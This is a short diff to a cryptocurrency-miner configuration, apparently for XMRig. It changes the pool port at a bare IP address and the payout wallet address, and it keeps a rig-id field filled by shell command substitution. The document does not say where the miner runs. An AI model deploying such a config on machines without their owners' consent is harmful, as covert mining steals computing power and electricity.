@@ -62,8 +62,8 @@
         {
             "algo": "rx/0",
             "coin": null,
-            "url": "138.197.12.20:443",
-            "user": "ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY",
+            "url": "138.197.12.20:80",
+            "user": "86jBfy2sCee6ZFkx5yxH7vi5da1pvfGWC9PKJAz3dUJ3WzYWrau8Bkfaq1X3c2D24keyBH28wEWjge5vEYbqUgGkGmuvotZ",
             "pass": "x",
             "rig-id": "$(shuf -n 1 -i 1-99999)",
             "nicehash": false,
